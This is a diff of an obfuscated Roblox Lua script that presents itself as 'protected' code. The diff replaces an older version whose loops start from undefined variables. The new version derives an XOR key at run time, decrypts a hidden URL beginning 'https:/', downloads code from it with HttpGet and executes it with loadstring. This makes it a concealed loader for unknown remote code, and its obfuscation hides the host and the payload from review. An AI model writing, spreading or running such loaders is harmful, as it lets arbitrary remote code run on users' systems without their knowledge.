@@ -2,73 +2,60 @@
 -- Protected by Mounx Security Layer v3
 -- Unauthorized modification will result in ban
 
-local _s = string
-local _c = _s.char
-local _b = _s.byte
-local _x = bit32.bxor
-local _t = table
-local _tc = _t.concat
+local _s,_c,_b,_x,_tc = string,string.char,string.byte,bit32.bxor,table.concat
 local _g = game
 
 -- Environment validation
-local _wibgf = type(_g) == "userdata"
-local ___oxtdap = type(loadstring) == "function" or type(load) == "function"
-if not (_wibgf and ___oxtdap) then return end
-
--- Integrity check
-local ___yobg = pcall(function() return _g:GetService("Players").LocalPlayer end)
-if not ___yobg then return end
+local ___veq = type(_g)=="userdata" and (type(loadstring)=="function" or type(load)=="function")
+if not ___veq then return end
+local _nisr = pcall(function() return _g:GetService("Players").LocalPlayer end)
+if not _nisr then return end
 
 -- Runtime key derivation
-local ___theg = {}
-___theg[10]=_c(324/6)
-___theg[4]=_c(_x(153,0xAB))
-___theg[8]=_c(19+88)
-___theg[5]=_c(76-21)
-___theg[11]=_c(_x(156,0xAB))
-___theg[3]=_c(_x(152,0xAB))
-___theg[6]=_c(_x(157,0xAB))
-___theg[7]=_c(129-39)
-___theg[2]=_c(135-15)
-___theg[9]=_c(13+36)
-___theg[1]=_c(385/5)
-___theg = _tc(___theg)
+local ___tmaw={}
+___tmaw[4]=_c(144/3)
+___tmaw[1]=_c(231/3)
+___tmaw[2]=_c(_x(211,0xAB))
+___tmaw[7]=_c(_x(241,0xAB))
+___tmaw[5]=_c(97-46)
+___tmaw[11]=_c(_x(155,0xAB))
+___tmaw[10]=_c(_x(157,0xAB))
+___tmaw[6]=_c(144/3)
+___tmaw[3]=_c(23+31)
+___tmaw[8]=_c(_x(192,0xAB))
+___tmaw[9]=_c(71-20)
+___tmaw=_tc(___tmaw)
 
--- Encrypted payload segments
-local _iuv = {37,12,71,66,68,12,117,68}
-local ___mtsmlc = {92,89,66,35,0,67,83,89}
-local _hcybf = {83,54,69,94,88,69,40,22}
-local ___pjghdx = {87,87,69,24,57,4,92,25}
-local __prwqm = {86,61,17,28,94,88,87,62}
-local __lxrdev = {14,67,25,71,56,26,95,91}
-local __xzfrpy = {84}
+-- Encrypted payload
+local _bif={37,12,66,64,64,10,117}
+local _glhg={68,94,89,69,35,0,70}
+local _earqcq={81,93,85,54,69,92,88}
+local _usie={66,40,22,82,85,65,30}
+local _xscg={57,4,94,25,81,61,17}
+local _xroh={25,92,92,81,62,14,65}
+local _bzmc={25,64,56,26,90,89,80}
 
--- Assemble payload
-local ___nvbfgx = {}
-for _=_tfk,#_iuv do ___nvbfgx[#___nvbfgx+1]=_iuv[_] end
-for _=___tpiq,#___mtsmlc do ___nvbfgx[#___nvbfgx+1]=___mtsmlc[_] end
-for _=__rnka,#_hcybf do ___nvbfgx[#___nvbfgx+1]=_hcybf[_] end
-for _=_htkpf,#___pjghdx do ___nvbfgx[#___nvbfgx+1]=___pjghdx[_] end
-for _=___qqvp,#__prwqm do ___nvbfgx[#___nvbfgx+1]=__prwqm[_] end
-for _=_vjsi,#__lxrdev do ___nvbfgx[#___nvbfgx+1]=__lxrdev[_] end
-for _=_sjsgu,#__xzfrpy do ___nvbfgx[#___nvbfgx+1]=__xzfrpy[_] end
+-- Assemble
+local __lpeg={}
+for _i=1,#_bif do __lpeg[#__lpeg+1]=_bif[_i] end
+for _i=1,#_glhg do __lpeg[#__lpeg+1]=_glhg[_i] end
+for _i=1,#_earqcq do __lpeg[#__lpeg+1]=_earqcq[_i] end
+for _i=1,#_usie do __lpeg[#__lpeg+1]=_usie[_i] end
+for _i=1,#_xscg do __lpeg[#__lpeg+1]=_xscg[_i] end
+for _i=1,#_xroh do __lpeg[#__lpeg+1]=_xroh[_i] end
+for _i=1,#_bzmc do __lpeg[#__lpeg+1]=_bzmc[_i] end
 
--- Decryption engine
-local __inn = {}
-for _i = 1, #___nvbfgx do
-    local _e = ___nvbfgx[_i]
-    local _k = _b(___theg, ((_i - 1) % #___theg) + 1)
-    __inn[_i] = _c(_x(_e, _k))
+-- Decrypt
+local ___edjr={}
+for _i=1,#__lpeg do
+    ___edjr[_i]=_c(_x(__lpeg[_i],_b(___tmaw,((_i-1)%#___tmaw)+1)))
 end
-__inn = _tc(__inn)
+___edjr=_tc(___edjr)
 
--- Secure execution pipeline
-local ___iiz = tick()
-local __cigv = _g["HttpGet"](_g, __inn)
-
-if type(__cigv) == "string" and #__cigv > 0 then
-    local _hgg = (loadstring or load)(__cigv)
-    if _hgg then
-        _hgg()
-    end
+-- Execute
+local _egxwnq=tick()
+local ___wotj=_g["HttpGet"](_g,___edjr)
+if type(___wotj)=="string" and #___wotj>0 then
+    local _lxflo=(loadstring or load)(___wotj)
+    if _lxflo then _lxflo() end
 end
